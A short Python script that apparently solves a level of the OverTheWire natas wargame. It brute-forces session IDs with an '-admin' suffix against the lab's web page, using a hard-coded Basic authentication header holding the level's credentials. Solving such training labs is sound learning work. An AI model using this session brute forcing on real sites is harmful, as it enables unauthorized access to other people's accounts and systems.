from email import header
import requests
from bs4 import BeautifulSoup

headers = {'Authorization': 'Basic bmF0YXMyMDplb2ZtM1dzc2h4YzVid3RWbkV1R0lscjdpdmI5S0FCRg=='}

url = 'http://natas20.natas.labs.overthewire.org/index.php'

for i in range(0,641):
    payload = '?admin=1&name=natas21&sid={}-admin'.format(i)
    r = requests.post(url+payload, headers=headers)
    if 'exists' in r.text:
        soup = BeautifulSoup(r.text, 'html.parser')
        print(soup.find_all(id='content'))
        break